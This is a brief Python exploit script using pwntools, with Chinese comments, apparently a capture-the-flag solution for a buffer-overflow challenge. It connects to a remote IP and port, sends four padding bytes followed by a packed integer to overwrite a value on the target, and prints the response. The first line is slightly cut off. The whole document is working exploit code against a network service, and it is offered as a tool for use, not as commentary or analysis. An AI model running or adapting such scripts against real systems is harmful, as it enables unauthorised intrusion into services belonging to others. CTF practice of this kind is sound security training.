rom pwn import *
#设置目标机的信息，用来建立远程链接，url或ip指明了主机，port设置端口
r = remote("111.200.241.244", 55725)
#设置payload，准备覆盖
payload = "a" * 4
payload += p64(1853186401).decode('unicode_escape')
#这是接受消息，直到什么停止这样
r.recvuntil("lets get helloworld for bof\n")
#发送消息
r.sendline(payload)
print(r.recv())
